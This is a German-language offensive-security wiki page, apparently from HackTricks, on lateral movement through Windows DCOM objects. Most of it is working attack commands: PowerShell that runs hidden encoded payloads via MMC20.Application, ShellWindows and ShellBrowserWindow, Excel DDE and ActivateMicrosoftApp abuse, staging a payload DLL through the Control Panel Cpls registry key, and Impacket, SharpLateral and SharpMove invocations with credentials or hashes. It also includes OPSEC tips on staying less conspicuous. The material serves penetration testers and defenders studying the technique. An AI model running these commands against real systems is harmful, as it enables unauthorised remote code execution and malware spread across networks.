# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM Lateral Movement ist attraktiv, weil dabei vorhandene COM-Server wiederverwendet werden, die über RPC/DCOM verfügbar sind, statt einen Dienst oder eine geplante Aufgabe zu erstellen. In der Praxis bedeutet das, dass die erste Verbindung normalerweise über TCP/135 beginnt und anschließend zu dynamisch zugewiesenen hohen RPC-Ports wechselt.

## Voraussetzungen & Fallstricke

- Normalerweise benötigen Sie auf dem Zielsystem einen lokalen Administratorkontext, und der Remote-COM-Server muss Remote-Start und -Aktivierung zulassen.
- Seit dem **14. März 2023** erzwingt Microsoft DCOM Hardening auf unterstützten Systemen. Alte Clients, die eine niedrige Authentifizierungsebene für die Aktivierung anfordern, können fehlschlagen, sofern sie nicht mindestens `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` aushandeln. Moderne Windows-Clients werden normalerweise automatisch auf eine höhere Ebene gesetzt, daher funktionieren aktuelle Tools in der Regel weiterhin.<sup>[[3]](#references)</sup>
- Manuelle oder skriptgesteuerte DCOM-Ausführung benötigt im Allgemeinen TCP/135 sowie den dynamischen RPC-Portbereich des Ziels. Wenn Sie Impackets `dcomexec.py` verwenden und die Befehlsausgabe zurückerhalten möchten, benötigen Sie normalerweise auch SMB-Zugriff auf `ADMIN$` (oder eine andere beschreibbare/lesbare Freigabe).
- Wenn RPC/DCOM funktioniert, aber SMB blockiert ist, kann `dcomexec.py -nooutput` weiterhin für eine blinde Ausführung nützlich sein.

Schnellprüfungen:

```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```

## MMC20.Application

Weitere Informationen zu dieser Technik finden Sie im [ursprünglichen Beitrag zu MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>

Objekte des Distributed Component Object Model (DCOM) bieten interessante Möglichkeiten für netzwerkbasierte Interaktionen mit Objekten. Microsoft stellt umfassende Dokumentationen zu DCOM und Component Object Model (COM) bereit, die [hier für DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) und [hier für COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>) verfügbar sind. Eine Liste der DCOM-Anwendungen lässt sich mit folgendem PowerShell-Befehl abrufen:

```bash
Get-CimInstance Win32_DCOMApplication
```

Das COM-Objekt [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) ermöglicht das Skripting von MMC-Snap-in-Vorgängen. Bemerkenswert ist, dass dieses Objekt unter `Document.ActiveView` die Methode `ExecuteShellCommand` enthält. Weitere Informationen zu dieser Methode finden Sie [hier](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Sehen Sie es in Aktion:<sup>[[6]](#references)</sup>

Mit dieser Funktion können Befehle über eine DCOM-Anwendung über ein Netzwerk ausgeführt werden. Um remote als Admin mit DCOM zu interagieren, kann PowerShell wie folgt verwendet werden:

```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```

Dieser Befehl stellt eine Verbindung zur DCOM-Anwendung her und gibt eine Instanz des COM-Objekts zurück. Anschließend kann die Methode ExecuteShellCommand aufgerufen werden, um einen Prozess auf dem Remotehost auszuführen. Der Vorgang umfasst die folgenden Schritte:

Methoden prüfen:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```

RCE erhalten:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
    "cmd.exe",
    $null,
    "/c powershell -NoP -W Hidden -Enc <B64>",
    "7"
)
```

Das letzte Argument ist der Fensterstil. `7` lässt das Fenster minimiert. Im Betrieb führt die Ausführung über MMC häufig dazu, dass ein entfernter `mmc.exe`-Prozess deine Payload startet. Das unterscheidet sich von den unten beschriebenen, auf Explorer basierenden Objekten.

## ShellWindows & ShellBrowserWindow

**Weitere Informationen zu dieser Technik findest du im ursprünglichen Beitrag [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Beim **MMC20.Application**-Objekt wurde kein anwendungsspezifischer `LaunchPermission`-Wert festgestellt.<sup>[[2]](#references)</sup> Das allein gewährt keinen Zugriff: COM prüft gegebenenfalls die ACL `DefaultLaunchPermission` des Computers sowie computerweite Einschränkungen für Start und Zugriff.<sup>[[9]](#references)[[10]](#references)</sup> Weitere Details findest du in [diesem Thread](https://twitter.com/tiraniddo/status/817532039771525120). Außerdem empfiehlt es sich, OleView .NET von [@tiraniddo](https://twitter.com/tiraniddo) zu verwenden, um Objekte ohne explizite Launch Permission herauszufiltern.

Zwei bestimmte Objekte, `ShellBrowserWindow` und `ShellWindows`, wurden hervorgehoben, da für sie keine expliziten Launch Permissions festgelegt sind.<sup>[[2]](#references)</sup> Ein fehlender `LaunchPermission`-Wert unter `HKCR:\AppID\{guid}` bedeutet, dass keine anwendungsspezifische Start-ACL vorhanden ist; es bedeutet **nicht**, dass die Remote-Aktivierung uneingeschränkt möglich ist.<sup>[[9]](#references)[[10]](#references)</sup>

Im Vergleich zu `MMC20.Application` sind diese Objekte aus OPSEC-Sicht oft unauffälliger, da der Befehl auf dem Remote-Host üblicherweise als Child-Prozess von `explorer.exe` statt von `mmc.exe` ausgeführt wird.

### ShellWindows

Da `ShellWindows` keine ProgID hat, ermöglichen die .NET-Methoden `Type.GetTypeFromCLSID` und `Activator.CreateInstance`, das Objekt mithilfe seiner CLSID zu instanziieren. Dabei wird OleView .NET verwendet, um die CLSID für `ShellWindows` abzurufen. Nach der Instanziierung kann über die Methode `WindowsShell.Item` mit dem Objekt interagiert werden. Dadurch lassen sich Methoden wie `Document.Application.ShellExecute` aufrufen.<sup>[[2]](#references)</sup>

Es wurden folgende PowerShell-Beispielbefehle zum Instanziieren des Objekts und zur Remote-Ausführung von Befehlen bereitgestellt:

```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```

### ShellBrowserWindow

`ShellBrowserWindow` ist ähnlich, aber du kannst es direkt über seine CLSID instanziieren und mit `Document.Application.ShellExecute` pivotieren:

```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
    "cmd.exe",
    "/c whoami > C:\\Windows\\Temp\\dcom.txt",
    "C:\\Windows\\System32",
    $null,
    0
)
```

### Lateral Movement mit Excel-DCOM-Objekten

Lateral Movement kann durch Ausnutzen von Excel-DCOM-Objekten erreicht werden. Ausführliche Informationen finden Sie in der Diskussion über die Nutzung von Excel DDE für Lateral Movement über DCOM im [Blog von Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>

Das Empire-Projekt stellt ein PowerShell-Skript bereit, das zeigt, wie Excel durch Manipulation von DCOM-Objekten für Remote Code Execution (RCE) genutzt werden kann. Unten finden Sie Ausschnitte aus dem Skript im [GitHub-Repository von Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), die verschiedene Methoden zum Missbrauch von Excel für RCE zeigen:

```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $isx64 = [boolean]$obj.Application.ProductCode[21]
    Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $Obj.DisplayAlerts = $false
    $Obj.DDEInitiate("cmd", "/c $Command")
}
```

Neuere Forschung hat diesen Bereich um die Methode `ActivateMicrosoftApp()` von `Excel.Application` erweitert. Die Grundidee ist, dass Excel versuchen kann, ältere Microsoft-Anwendungen wie FoxPro, Schedule Plus oder Project zu starten, indem es den System-`PATH` durchsucht. Wenn ein Operator einen Payload unter einem dieser erwarteten Namen an einem beschreibbaren Ort im `PATH` des Ziels ablegen kann, führt Excel ihn aus.<sup>[[4]](#references)</sup>

Voraussetzungen für diese Variante:

- Lokaler Administrator auf dem Zielsystem
- Excel ist auf dem Zielsystem installiert
- Möglichkeit, einen Payload in ein beschreibbares Verzeichnis im `PATH` des Zielsystems zu schreiben

Praktisches Beispiel für den Missbrauch der FoxPro-Suche (`FOXPROW.exe`):

```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```

Wenn der angreifende Host nicht über die lokale `Excel.Application`-ProgID-Registrierung verfügt, instanziiere das Remote-Objekt stattdessen über die CLSID:

```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```

In der Praxis missbrauchte Werte:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — Laden einer registrierten Systemsteuerungs-DLL

Die Klasse `COpenControlPanel` (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) stellt `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`) bereit. Ihre Methode `Open()` bewirkt, dass Systemsteuerungs-DLLs, die unter dem Schlüssel `Control Panel\Cpls` registriert sind, von einem Remote-`dllhost.exe` geladen werden. Auf den getesteten Systemen hat die Klasse keine expliziten Start-/Zugriffsberechtigungen und übernimmt daher die standardmäßige DCOM-Richtlinie (die für die Remote-Aktivierung normalerweise Administratorrechte erfordert). Ein beliebiger Elementname genügt, damit `Open()` die registrierten DLLs verarbeitet; die Payload benötigt keine `.cpl`-Erweiterung, muss jedoch eine gültige DLL mit der passenden Architektur sein.<sup>[[7]](#references)</sup>

Dieses Primitive ist **stage-and-trigger** und keine reine Befehlsausführung: Kopieren Sie zuerst eine DLL auf das Ziel und erstellen Sie einen `REG_EXPAND_SZ`-Wert, der auf sie verweist. Aktivieren Sie anschließend das Objekt über DCOM. Zum Beispiel aus einem administrativen Windows-Kontext:<sup>[[7]](#references)</sup>

```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```

Der öffentlich verfügbare [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)-Client implementiert den undokumentierten DCOM-Aufruf mit Impacket. Die Angabe eines beliebigen Namens für ein Control Panel-Element genügt; der Client kann einen RPC-Fehler melden, obwohl `dllhost.exe` die DLL geladen hat.<sup>[[8]](#references)</sup>

```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```

Operativ benötigt dieser Pfad außerdem einen Datei-Schreibkanal und Zugriff auf die Remote-Registry und ist daher auffälliger als `MMC20`/`ShellWindows`. Er erzeugt einen Persistenzeffekt, da ein späteres Öffnen der Systemsteuerung denselben Eintrag erneut laden kann. Entfernen Sie den Wert nach der Ausführung und suchen Sie nach unerwarteten Werten unter `Control Panel\Cpls` sowie nach ungewöhnlichen DLL-Ladevorgängen in `dllhost.exe`.<sup>[[7]](#references)</sup>

```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```

### Automation Tools for Lateral Movement

Zwei Tools werden zur Automatisierung dieser Techniken hervorgehoben:

- **Invoke-DCOM.ps1**: Ein PowerShell-Skript des Empire-Projekts, das die Ausführung verschiedener Methoden zum Ausführen von Code auf Remotecomputern vereinfacht. Dieses Skript ist im GitHub-Repository von Empire verfügbar.

- **SharpLateral**: Ein Tool zum Remote-Ausführen von Code, das mit folgendem Befehl verwendet werden kann:

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- [SharpMove](https://github.com/0xthirteen/SharpMove):

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```

## Automatische Tools

- Das Powershell-Skript [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) ermöglicht es, alle kommentierten Methoden zur Codeausführung auf anderen Rechnern einfach aufzurufen.
- Mit Impackets `dcomexec.py` kannst du Befehle auf Remotesystemen über DCOM ausführen. Aktuelle Builds unterstützen `ShellWindows`, `ShellBrowserWindow` und `MMC20`; standardmäßig wird `ShellWindows` verwendet.

```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```

- Du könntest auch [**SharpLateral**](https://github.com/mertdas/SharpLateral) verwenden:

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- Du könntest auch [**SharpMove**](https://github.com/0xthirteen/SharpMove) verwenden.

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```





## References

- [1] [Laterale Bewegung mit dem MMC20.Application-COM-Objekt](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Laterale Bewegung über DCOM: Runde 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Änderungen für die Umgehung der Windows-DCOM-Serversicherheitsfunktion verwalten (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Laterale Bewegung: Die Leistungsfähigkeit der DCOM-Excel-Anwendung ausnutzen](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Excel DDE für laterale Bewegung über DCOM nutzen](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com – MMC-Anwendungsklasse (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [DCOM-Objekte für die Remote-Befehlsausführung verwenden](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
- [9] [DefaultLaunchPermission – Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/com/defaultlaunchpermission)
- [10] [MS-DCOM: Anhang B, Produktverhalten – Microsoft Learn](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/acc42954-4073-4f05-b850-efd562022077)
{{#include ../../banners/hacktricks-training.md}}
